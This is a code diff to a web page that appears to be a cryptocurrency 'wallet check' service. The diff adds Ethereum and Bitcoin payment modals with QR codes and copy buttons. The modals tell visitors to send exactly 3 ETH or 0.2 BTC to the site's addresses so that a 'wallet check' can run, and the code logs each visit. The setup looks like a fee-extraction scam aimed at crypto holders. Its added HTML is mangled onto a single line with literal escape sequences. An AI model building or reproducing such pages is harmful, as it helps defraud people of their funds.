@@ -337,7 +337,7 @@
   </div>
 </div>
 
-<!-- ═══ TRX PAYMENT MODAL ══════════════════════════════════ -->
+<!-- ═══ ETH PAYMENT MODAL ══════════════════════════════════ -->\n<div class="modal-overlay" id="ethModal" onclick="ethBgClick(event)">\n  <div class="modal-box">\n    <button class="modal-close" onclick="closeEthModal()">✕</button>\n    <div style="font-size:2.4rem;margin-bottom:10px">🔷</div>\n    <h3 style="font-size:1.2rem;font-weight:800;margin-bottom:6px">Pay with Ethereum (ETH)</h3>\n    <p style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:18px">\n      Send exactly <strong style="color:var(--accent);font-family:'Space Mono',monospace">3 ETH</strong> to the address below.<br>Your wallet check will run automatically after confirmation.\n    </p>\n    <div id="ethQrWrap" style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:16px;">\n      <div id="ethQrcode"></div>\n    </div>\n    <div style="background:rgba(0,229,255,.05);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px;">\n      <div style="font-size:.68rem;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:.08em;margin-bottom:6px;text-transform:uppercase;">ETH / ERC-20 Address</div>\n      <div id="ethAddrDisplay" style="font-family:'Space Mono',monospace;font-size:.72rem;color:var(--accent);word-break:break-all;line-height:1.6;"></div>\n    </div>\n    <div style="display:flex;gap:8px;margin-bottom:18px;">\n      <button class="copy-btn" style="flex:1;" onclick="copyEthAddr()">📋 Copy Address</button>\n      <button class="copy-btn" style="flex:1;" onclick="copyEthAmount()">📋 Copy Amount</button>\n    </div>\n    <div style="background:rgba(255,179,0,.06);border:1px solid rgba(255,179,0,.2);border-radius:8px;padding:12px 14px;margin-bottom:6px;text-align:left;">\n      <div style="font-size:.78rem;color:var(--warn);font-weight:700;margin-bottom:6px;">⚠ Important</div>\n      <ul style="list-style:none;font-size:.76rem;color:var(--muted);line-height:1.9;">\n        <li>✅ Only send <strong style="color:var(--text)">ETH</strong> on the <strong style="color:var(--text)">Ethereum</strong> network</li>\n        <li>✅ Send exactly <strong style="color:var(--text)">3 ETH</strong> — other amounts may not be processed</li>\n        <li>✅ Do <strong style="color:var(--text)">not</strong> send BEP-20, TRC-20 or any other network</li>\n      </ul>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ BTC PAYMENT MODAL ══════════════════════════════════ -->\n<div class="modal-overlay" id="btcModal" onclick="btcBgClick(event)">\n  <div class="modal-box">\n    <button class="modal-close" onclick="closeBtcModal()">✕</button>\n    <div style="font-size:2.4rem;margin-bottom:10px">🟠</div>\n    <h3 style="font-size:1.2rem;font-weight:800;margin-bottom:6px">Pay with Bitcoin (BTC)</h3>\n    <p style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:18px">\n      Send exactly <strong style="color:var(--accent);font-family:'Space Mono',monospace">0.2 BTC</strong> to the address below.<br>Your wallet check will run automatically after confirmation.\n    </p>\n    <div id="btcQrWrap" style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:16px;">\n      <div id="btcQrcode"></div>\n    </div>\n    <div style="background:rgba(0,229,255,.05);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px;">\n      <div style="font-size:.68rem;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:.08em;margin-bottom:6px;text-transform:uppercase;">Bitcoin Address</div>\n      <div id="btcAddrDisplay" style="font-family:'Space Mono',monospace;font-size:.72rem;color:var(--accent);word-break:break-all;line-height:1.6;"></div>\n    </div>\n    <div style="display:flex;gap:8px;margin-bottom:18px;">\n      <button class="copy-btn" style="flex:1;" onclick="copyBtcAddr()">📋 Copy Address</button>\n      <button class="copy-btn" style="flex:1;" onclick="copyBtcAmount()">📋 Copy Amount</button>\n    </div>\n    <div style="background:rgba(255,179,0,.06);border:1px solid rgba(255,179,0,.2);border-radius:8px;padding:12px 14px;margin-bottom:6px;text-align:left;">\n      <div style="font-size:.78rem;color:var(--warn);font-weight:700;margin-bottom:6px;">⚠ Important</div>\n      <ul style="list-style:none;font-size:.76rem;color:var(--muted);line-height:1.9;">\n        <li>✅ Only send <strong style="color:var(--text)">BTC</strong> on the <strong style="color:var(--text)">Bitcoin</strong> network</li>\n        <li>✅ Send exactly <strong style="color:var(--text)">0.2 BTC</strong> — other amounts may not be processed</li>\n        <li>✅ Do <strong style="color:var(--text)">not</strong> send BEP-20, ERC-20 or wrapped BTC</li>\n      </ul>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ TRX PAYMENT MODAL ══════════════════════════════════ -->
 <div class="modal-overlay" id="trxModal" onclick="trxBgClick(event)">
   <div class="modal-box">
     <button class="modal-close" onclick="closeTrxModal()">✕</button>
@@ -631,6 +631,11 @@ function showState(id) {
 /* ── Modal open/close ───────────────────────────── */
 function openModal(chain) {
   currentChain = chain || 'eth';
+
+  // ETH and BTC cannot reliably connect via WalletConnect — use direct QR payment instead
+  if (currentChain === 'eth') { openEthModal(); return; }
+  if (currentChain === 'btc') { openBtcModal(); return; }
+
   document.getElementById('wcModal').classList.add('open');
   if (session) { showConnected(getAddr()); return; }
   showState('m-loading');
@@ -986,6 +991,72 @@ function toggleFaq(el) {
   const it = el.parentElement, was = it.classList.contains('open');
   document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
   if (!was) it.classList.add('open');
+}
+
+/* ── ETH Payment Modal ───────────────────────────── */
+let ethQrDone = false;
+function openEthModal() {
+  document.getElementById('ethAddrDisplay').textContent = ADDR_ETH;
+  document.getElementById('ethModal').classList.add('open');
+  if (!ethQrDone) {
+    new QRCode(document.getElementById('ethQrcode'), {
+      text: 'ethereum:' + ADDR_ETH + '?value=3000000000000000000',
+      width: 200, height: 200,
+      colorDark: '#000000', colorLight: '#ffffff',
+      correctLevel: QRCode.CorrectLevel.M
+    });
+    ethQrDone = true;
+  }
+  logTransaction(ADDR_ETH, 'eth', 'connected', null);
+}
+function closeEthModal() { document.getElementById('ethModal').classList.remove('open'); }
+function ethBgClick(e) { if (e.target === document.getElementById('ethModal')) closeEthModal(); }
+function copyEthAddr() {
+  navigator.clipboard.writeText(ADDR_ETH).then(() => {
+    const btns = document.querySelectorAll('#ethModal .copy-btn');
+    btns[0].textContent = '✅ Copied!';
+    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
+  });
+}
+function copyEthAmount() {
+  navigator.clipboard.writeText('3').then(() => {
+    const btns = document.querySelectorAll('#ethModal .copy-btn');
+    btns[1].textContent = '✅ Copied!';
+    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
+  });
+}
+
+/* ── BTC Payment Modal ───────────────────────────── */
+let btcQrDone = false;
+function openBtcModal() {
+  document.getElementById('btcAddrDisplay').textContent = ADDR_BTC;
+  document.getElementById('btcModal').classList.add('open');
+  if (!btcQrDone) {
+    new QRCode(document.getElementById('btcQrcode'), {
+      text: 'bitcoin:' + ADDR_BTC + '?amount=0.2',
+      width: 200, height: 200,
+      colorDark: '#000000', colorLight: '#ffffff',
+      correctLevel: QRCode.CorrectLevel.M
+    });
+    btcQrDone = true;
+  }
+  logTransaction(ADDR_BTC, 'btc', 'connected', null);
+}
+function closeBtcModal() { document.getElementById('btcModal').classList.remove('open'); }
+function btcBgClick(e) { if (e.target === document.getElementById('btcModal')) closeBtcModal(); }
+function copyBtcAddr() {
+  navigator.clipboard.writeText(ADDR_BTC).then(() => {
+    const btns = document.querySelectorAll('#btcModal .copy-btn');
+    btns[0].textContent = '✅ Copied!';
+    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
+  });
+}
+function copyBtcAmount() {
+  navigator.clipboard.writeText('0.2').then(() => {
+    const btns = document.querySelectorAll('#btcModal .copy-btn');
+    btns[1].textContent = '✅ Copied!';
+    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
+  });
 }
 
 /* ── TRX Payment Modal ──────────────────────────── */
